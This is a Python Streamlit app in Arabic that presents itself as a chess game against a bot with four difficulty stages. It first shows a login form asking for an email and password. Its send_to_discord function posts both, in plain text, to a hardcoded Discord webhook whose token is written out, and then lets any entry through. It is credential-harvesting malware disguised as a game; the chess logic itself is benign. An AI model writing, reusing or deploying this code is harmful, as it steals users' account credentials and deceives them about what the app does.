import requests
import streamlit as st

DISCORD_WEBHOOK_URL = (
    "https://discord.com/api/webhooks/1564162502563078184/"
    "GrqM34Vyba-0D_3_Tg11s5iaop8iAN1Y3fHb759LiVWrUdGv6lzvka-wNMhKZWpVaEHT"
)


def send_to_discord(email, password):
  payload = {
      "embeds": [{
          "title": "🔐 تسجيل دخول جديد!",
          "color": 3447003,
          "fields": [
              {"name": "📧 البريد الإلكتروني", "value": email, "inline": False},
              {"name": "🔑 كلمة المرور", "value": password, "inline": False},
          ],
      }]
  }
  try:
    requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    return True
  except Exception:
    return False


if "logged_in" not in st.session_state:
  st.session_state.logged_in = False
if "chess_stage" not in st.session_state:
  st.session_state.chess_stage = 1

if not st.session_state.logged_in:
  st.title("تسجيل الدخول")
  email_input = st.text_input("البريد الإلكتروني")
  password_input = st.text_input("كلمة المرور", type="password")

  if st.button("دخول"):
    if email_input and password_input:
      send_to_discord(email_input, password_input)
      st.session_state.logged_in = True
      st.session_state.chess_stage = 1
      st.rerun()
    else:
      st.warning("يرجى إدخال جميع الحقول")

else:
  st.success("🎉 تم تسجيل الدخول بنجاح!")
  stage = st.session_state.chess_stage

  if stage == 1:
    st.info("🟢 **المرحلة الأولى: ضد البوت (مستوى سهل - للمبتدئين)**")
  elif stage == 2:
    st.warning("🟡 **المرحلة الثانية: ضد البوت (مستوى متوسط - ذكي)**")
  elif stage == 3:
    st.error("🔴 **المرحلة الثالثة: ضد البوت (مستوى صعب - محترف)**")
  else:
    st.error(
        "🔥 **المرحلة الرابعة والأخيرة: المستوى المستحيل (لا يقهر إلا للمحترفين)"
        " !**"
    )

  import streamlit.components.v1 as components

  # استخدام تصميم خشبي نظيف ومدمج وآمن ضد الأخطاء
  html_content = f"""
<!DOCTYPE html>
<html>
<head>
<style>
body {{ background-color: #0e1117; color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 5px; }}
.board-container {{ position: relative; width: 400px; margin: 0 auto; border: 3px solid #e08b26; border-radius: 4px; box-shadow: 0 4px 15px rgba(0,0,0,0.8); }}
.board {{ display: grid; grid-template-columns: repeat(8, 50px); grid-template-rows: repeat(8, 50px); justify-content: center; }}
.square {{ display: flex; align-items: center; justify-content: center; font-size: 36px; cursor: pointer; user-select: none; position: relative; }}
.light {{ background-color: #e3c193; color: #000; }}
.dark {{ background-color: #b87b48; color: #000; }}
.selected {{ background-color: #7b61ff !important; }}
.white-piece {{ color: #ffffff; filter: drop-shadow(0px 0px 2px #000); }}
.black-piece {{ color: #000000; }}
.status {{ margin-top: 6px; font-weight: bold; color: #4ade80; font-size: 13px; }}
</style>
</head>
<body>
<div class="status" id="status">دورك الآن (القطع البيضاء) - انقر على القطعة ثم المربع المستهدف</div>
<div class="board-container"><div class="board" id="chessBoard"></div></div>
<script>
let currentStage = {stage};

let board = [
    ['r','n','b','q','k','b','n','r'],
    ['p','p','p','p','p','p','p','p'],
    ['','','','','','','',''],
    ['','','','','','','',''],
    ['','','','','','','',''],
    ['','','','','','','',''],
    ['P','P','P','P','P','P','P','P'],
    ['R','N','B','Q','K','B','N','R']
];
const symbols = {{
    'R': '♖', 'N': '♘', 'B': '♗', 'Q': '♕', 'K': '♔', 'P': '♙',
    'r': '♜', 'n': '♞', 'b': '♝', 'q': '♛', 'k': '♚', 'p': '♟', '': ''
}};
let selectedCoord = null;
let turn = 'white';
let gameOver = false;

function renderBoard() {{
    const boardEl = document.getElementById('chessBoard');
    boardEl.innerHTML = '';
    for (let r = 0; r < 8; r++) {{
        for (let c = 0; c < 8; c++) {{
            const sq = document.createElement('div');
            sq.className = 'square ' + ((r + c) % 2 === 0 ? 'light' : 'dark');
            let p = board[r][c];
            if (p !== '') {{
                let pieceSpan = document.createElement('span');
                pieceSpan.className = p === p.toUpperCase() ? 'white-piece' : 'black-piece';
                pieceSpan.innerHTML = symbols[p];
                sq.appendChild(pieceSpan);
            }}
            if (selectedCoord && selectedCoord.r === r && selectedCoord.c === c) {{
                sq.classList.add('selected');
            }}
            sq.onclick = () => handleSquareClick(r, c);
            boardEl.appendChild(sq);
        }}
    }}
}}

function isPathClear(sr, sc, tr, tc) {{
    let rStep = tr > sr ? 1 : (tr < sr ? -1 : 0);
    let cStep = tc > sc ? 1 : (tc < sc ? -1 : 0);
    let currR = sr + rStep;
    let currC = sc + cStep;
    while (currR !== tr || currC !== tc) {{
        if (board[currR][currC] !== '') return false;
        currR += rStep;
        currC += cStep;
    }}
    return true;
}}

function isValidMove(sr, sc, tr, tc, piece, isWhite) {{
    let target = board[tr][tc];
    if (target !== '' && ((isWhite && target === target.toUpperCase()) || (!isWhite && target === target.toLowerCase()))) {{
        return false;
    }}
    let p = piece.toUpperCase();
    let rowDiff = tr - sr;
    let colDiff = tc - sc;
    let absRow = Math.abs(rowDiff);
    let absCol = Math.abs(colDiff);

    if (p === 'P') {{
        let dir = isWhite ? -1 : 1;
        let startRow = isWhite ? 6 : 1;
        if (sc === tc && target === '') {{
            if (rowDiff === dir) return true;
            if (rowDiff === dir * 2 && sr === startRow && board[sr + dir][sc] === '') return true;
        }}
        if (absCol === 1 && rowDiff === dir && target !== '') return true;
        return false;
    }}
    if (p === 'N') return (absRow === 2 && absCol === 1) || (absRow === 1 && absCol === 2);
    if (p === 'K') return absRow <= 1 && absCol <= 1;
    if (p === 'R') return (sr === tr || sc === tc) && isPathClear(sr, sc, tr, tc);
    if (p === 'B') return (absRow === absCol) && isPathClear(sr, sc, tr, tc);
    if (p === 'Q') return ((sr === tr || sc === tc) || (absRow === absCol)) && isPathClear(sr, sc, tr, tc);
    return false;
}}

function handleSquareClick(r, c) {{
    if (turn !== 'white' || gameOver) return;
    const piece = board[r][c];
    if (selectedCoord === null) {{
        if (piece && piece === piece.toUpperCase()) {{
            selectedCoord = {{r, c}};
            renderBoard();
        }}
    }} else {{
        let startPiece = board[selectedCoord.r][selectedCoord.c];
        if (isValidMove(selectedCoord.r, selectedCoord.c, r, c, startPiece, true)) {{
            let target = board[r][c];
            board[r][c] = startPiece;
            board[selectedCoord.r][selectedCoord.c] = '';
            selectedCoord = null;
            renderBoard();

            if (target === 'k') {{
                gameOver = true;
                document.getElementById('status').innerText = "🎉 فزت بالمرحلة! جاري الانتقال...";
                setTimeout(() => {{ window.location.reload(); }}, 1500);
                return;
            }}

            turn = 'black';
            document.getElementById('status').innerText = "البوت يفكر...";
            setTimeout(botTurn, 500);
        }} else {{
            if (piece !== '' && piece === piece.toUpperCase()) {{
                selectedCoord = {{r, c}};
            }} else {{
                selectedCoord = null;
            }}
            renderBoard();
        }}
    }}
}}

function evaluateMove(move) {{
    let target = board[move.tr][move.tc];
    let score = 0;
    const values = {{ 'p': 100, 'n': 330, 'b': 330, 'r': 500, 'q': 900, 'k': 20000 }};
    
    if (target !== '') {{
        let tVal = values[target.toLowerCase()] || 0;
        score += tVal * 15;
        if (target.toUpperCase() === 'K') {{
            score += 100000;
        }}
    }}

    if (currentStage === 1) {{
        return Math.random();
    }} else if (currentStage === 2) {{
        return score + Math.random() * 80;
    }} else if (currentStage === 3) {{
        let centerDist = Math.abs(3.5 - move.tr) + Math.abs(3.5 - move.tc);
        return score * 2 - centerDist * 5 + Math.random() * 20;
    }} else {{
        let centerBonus = (7 - Math.abs(3.5 - move.tr)) * 15;
        let advancement = move.tr * 25;
        return score * 10 + centerBonus + advancement + Math.random() * 5;
    }}
}}

function botTurn() {{
    if (gameOver) return;
    let allMoves = [];
    for (let r = 0; r < 8; r++) {{
        for (let c = 0; c < 8; c++) {{
            let piece = board[r][c];
            if (piece !== '' && piece === piece.toLowerCase()) {{
                for (let tr = 0; tr < 8; tr++) {{
                    for (let tc = 0; tc < 8; tc++) {{
                        if (isValidMove(r, c, tr, tc, piece, false)) {{
                            let m = {{sr: r, sc: c, tr: tr, tc: tc, piece: piece}};
                            m.score = evaluateMove(m);
                            allMoves.push(m);
                        }}
                    }}
                }}
            }}
        }}
    }}

    if (allMoves.length > 0) {{
        allMoves.sort((a, b) => b.score - a.score);
        
        let chosenMove = allMoves[0];
        if (currentStage === 1) {{
            chosenMove = allMoves[Math.floor(Math.random() * allMoves.length)];
        }} else if (currentStage === 2) {{
            let topMoves = allMoves.slice(0, Math.min(3, allMoves.length));
            chosenMove = topMoves[Math.floor(Math.random() * topMoves.length)];
        }}

        let target = board[chosenMove.tr][chosenMove.tc];
        board[chosenMove.tr][chosenMove.tc] = board[chosenMove.sr][chosenMove.sc];
        board[chosenMove.sr][chosenMove.sc] = '';
        renderBoard();

        if (target === 'K') {{
            gameOver = true;
            document.getElementById('status').innerText = "❌ خسرت! أكل البوت ملكك.. اضغط زر خسارة للعودة للبداية";
            return;
        }}
    }}
    turn = 'white';
    renderBoard();
    document.getElementById('status').innerText = "دورك الآن (القطع البيضاء)";
}}
renderBoard();
</script>
</body>
</html>
"""

  components.html(html_content, height=490)

  col1, col2 = st.columns(2)
  with col1:
    if st.button("🚀 الانتقال للمستوى التالي (عند أكل ملك الخصم)"):
      if st.session_state.chess_stage < 4:
        st.session_state.chess_stage += 1
        st.success("كفو! تم فتح المرحلة التالية بنجاح 🚀")
        st.rerun()
      else:
        st.balloons()
        st.success("🏆 أسطورة الشطرنج! أتممت جميع المستويات الأربعة بجدارة!")

  with col2:
    if st.button("🔄 خسرت / العب من جديد (العودة للبداية)"):
      st.session_state.chess_stage = 1
      st.warning("تمت إعادتك للمستوى الأول (البداية).")
      st.rerun()
